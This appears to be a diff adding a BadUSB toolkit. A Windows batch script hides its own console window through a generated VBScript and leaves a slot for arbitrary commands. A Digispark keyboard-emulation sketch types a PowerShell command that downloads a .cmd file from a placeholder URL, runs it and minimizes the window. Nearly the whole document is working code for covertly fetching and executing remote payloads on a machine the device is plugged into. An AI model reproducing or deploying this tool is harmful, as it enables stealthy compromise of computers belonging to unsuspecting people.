@@ -1,0 +1,60 @@
+:: This hides the shell window while running commands
+:: after first run, inv.vbs is created in %temp%... Invoke like this in future runs to hide window:
+::    inv.vbs r1.cmd ry
+@echo off
+cd %temp%
+
+if not exist inv.vbs (
+echo CreateObject^("Wscript.Shell"^).Run "" ^& WScript.Arguments^(0^) ^& "", 0, False > inv.vbs
+inv.vbs "r1.cmd ry"
+exit
+)
+
+if not [%1]==[ry] (
+inv.vbs "r1.cmd ry"
+exit
+)
+
+::Commands go here!
+
+
+
+
+
+
+
+
+
+
+
+#include "DigiKeyboard.h"
+
+void setup() {
+  // don't need to set anything up to use DigiKeyboard
+}
+
+void loop() {
+  // this is generally not necessary but with some older systems it seems to
+  // prevent missing the first character after a delay:
+  DigiKeyboard.sendKeyStroke(0);
+  
+DigiKeyboard.delay(1500);
+//run prompt
+DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+DigiKeyboard.delay(300);
+DigiKeyboard.print(F("cmd"));
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+//cmd should now open. Short delay
+DigiKeyboard.delay(1000);
+//type command to download and run batch file. Also works with vbs/exe/whatever
+DigiKeyboard.print(F("powershell wget http://<URL-TO-CMD-FILE-ON-INTERNET> -OutFile $env:temp/r1.cmd && start %temp%/r1.cmd && exit"));
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+//the next two lines minimize the cmd window
+DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT);
+DigiKeyboard.sendKeyStroke(KEY_N);
+//looooooong delay before exit, cuz exit appears lead to some sort of error which makes windows prompt "Unrecognized device" or "Device malfunctioned"
+DigiKeyboard.delay(100000);
+exit(0);
+}
+                     
+                     
